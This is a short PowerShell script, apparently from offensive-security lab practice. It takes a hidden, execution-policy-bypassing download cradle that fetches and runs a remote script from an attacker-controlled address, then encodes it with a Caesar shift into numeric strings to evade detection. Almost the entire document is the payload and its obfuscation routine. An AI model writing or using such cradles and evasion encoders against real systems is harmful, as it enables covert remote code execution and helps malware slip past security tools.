# String to obfuscate
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.175:8000/test/run.ps1'))"

echo "Payload:"
$payload

# Caesar value (17 as an example)
$caesar = 17

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + $caesar
    if($thischar.Length -eq 1){
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2){
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3){
        $output += $thischar
    }
}

echo "---------------------"

echo "Obfuscated with Caesar $caesar :"
$output # | clip
